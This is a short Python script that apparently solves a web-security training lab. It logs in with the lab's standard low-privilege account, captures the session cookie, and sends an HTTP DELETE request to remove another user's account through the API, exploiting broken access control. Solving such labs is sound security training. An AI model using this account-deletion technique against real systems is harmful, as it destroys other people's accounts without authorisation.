import mechanize
import requests
import sys


class Solver:
    def __init__(self, lab_url):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
        self.br = mechanize.Browser()

    def get_session_token(self):
        session_token = ''
        self.br.open(self.lab_url + 'login')
        self.br.select_form(nr=0)
        self.br.form['username'] = 'wiener'
        self.br.form['password'] = 'peter'
        self.br.submit()
        for cookie in self.br.cookiejar:
            if cookie.name == 'session':
                session_token = cookie.value
        return session_token

    def delete_the_user(self):
        headers = {
            'Cookie': 'session={}'.format(self.get_session_token())
        }
        response = requests.delete(self.lab_url + 'api/user/carlos', headers=headers)
        if 'User deleted' in response.text:
            print('You solved the lab.')
            print('Coded by Mohamed Ahmed (ma4747gh).')
            print('My GitHub account: https://github.com/ma4747gh')
            print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')

    def start(self):
        self.delete_the_user()


solver = Solver(sys.argv[1])
solver.start()
